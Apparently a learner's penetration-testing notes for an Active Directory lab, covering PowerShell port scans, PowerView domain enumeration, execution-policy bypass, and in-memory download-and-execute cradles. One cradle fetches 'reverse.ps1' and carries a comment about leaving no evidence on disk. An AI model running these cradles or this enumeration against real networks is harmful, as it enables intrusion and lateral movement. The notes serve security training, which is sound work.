# Internal Network Enumeration

    • Tools like nmap, netcat or built-in utilities like PowerShell can also be used
    for enumeration purposes.
    • Below is the command for scanning open TCP ports from a PowerShell
    Query.
   ``` powershell
   1..1024 | % {echo ( (new—object Net.Sockets.TcpClient).Connect("10.0.0.100", $_)) "Port $_ is open!" } 2>$null

   OR 

   442..443 | % { Test-NetConnection "google.com" -Port $_ -InformationLevel Quiet }


    # Below command will scan IP addresses 10.1.1.1-5 and some specific common TCP ports.

   1..20 | % { $a = $_; write-host "-----" write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $ _ is open!"} 2>$null}

    # source -> https://www.sans.org/blog/sans-pen-test-cheat-sheet-powershell
   ```



## AD Essentials 
    • In the local environment we have 3 machines setup in a domain environment. One can use Windows PowerShell, Windows native executable for the enumeration and exploitation purposes.
    • In-scope IP address range .
    10.10.10.2      Domain Controller
    10.10.10.3      Application Server
    10.10.10.4      Employee System
   
   
## Windows Powershell
    • Windows PowerShell
    • It is a .NET interpreter which comes installed by-default on all Windows versions.
    • One can execute binaries and scripts completely in-memory using PowerShell.
    • Through PowerShell one can administer a network and provides access to
    manage Active Directory environment.

    • Useful for Lateral Movement scenarios
        • PowerShell Remoting
        •Web-Based PowerShell Remoting
    • In powershell everything is a object

## Invoking a PowerShell Module
    • Scripts with extension "*.ps1", "*.psm1", "*.psd1" etc can be invoked in a specific PowerShell session as follows :
``` powershell
    Import-Module <ModuIe_Name.ps1>
```
    • However a PowerShell script can be invoked in a unique way called "dot sourcing a
    script"
``` powershell
    .\<Script_Name>.ps1
```    
PowerShell in-memory Download and Execute cradle :
``` powershell
    iex (iwr 'http://192.168.2.2/file.ps11)

    $down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1")
        $read = $down.GetResponse()
    IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()

    $file=New-Object -ComObject
    Msxm12.XMLHTTP;$file.openCGET','http://192.168.2.2/file.psl',$false);$file.sen
    d();iex$file.responseText

    iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')
    # DownloadString fxn will download the script directly into the memmory not in the hard disk so no evidence.

    # if you are running a powershell script in a new machine and it shows error - running scripts are disabled on this system then run the following command
    powershell -ep bypass
    
```
## Recon in the Internal Network
    • We already have access to the internal environment.
    • Credentials of a user is found on the Web-Server, which gave us access to the Employee-Machine.
    • In-built functionalities like PowerShell and WMI can be used for situational
    awareness in the network.
    • Adversary always heads for the direction of placement or setup of critical asset of a
    company.

    • We will use PowerView for enumeration.
    • Get current domain 
        [Get-NetDomain]
        [Get-NetDomain -Domain cyberwarfare.corp]

    • Retrieve Current SID and Domain Controller
        [Get-NetDomainController -Domain cyberwarfare.corp]
        Get-DomainSID


## Powerview commands

``` powershell

    .\PowerView_dev.ps1
    # if a script shows no error that means nothing was output of the script and it has been loaded in the memmory in your current powershell session.

    # List of current users
        net user 
        net user /domain 
        Get-NetUser
        Get-NetUser | Select-Object givenname
        Get-NetUser -UserName emp1

    # get current domain
        Get-NetDomain

    # Retrieve a list of users in a current domain
        Get-NetUser 
        Get-NetUser-UserName emp1

    # get info about DC
        Get-DomainController
        Get-DomainSID
        Get-DomainSID -Domain labs.corp -Verbose

    # get list of computers in the domain
        Get-NetComputer 
        Get-NetComputer -FullData
        Get-NetComputer -Verbose

    # get list of all groups in the domain
        Get-NetGroup 
        Get-NetGroupMember -Identity "Domain Admin"

    # Enumerate all domain in a forest
        Get-NetForestDomain -Verbose
        Get-NetForest -Verbose

    # find computer sessions where current user has local admin access
        Find-LocalAdminAccess -Verbose

    # XTRAS
        Invoke-ACLScanner -ResolveGUIDS -Verbose
        
    
    # This commands are not any default cmdlet but a cmdlet/command in that script that has been loaded.

```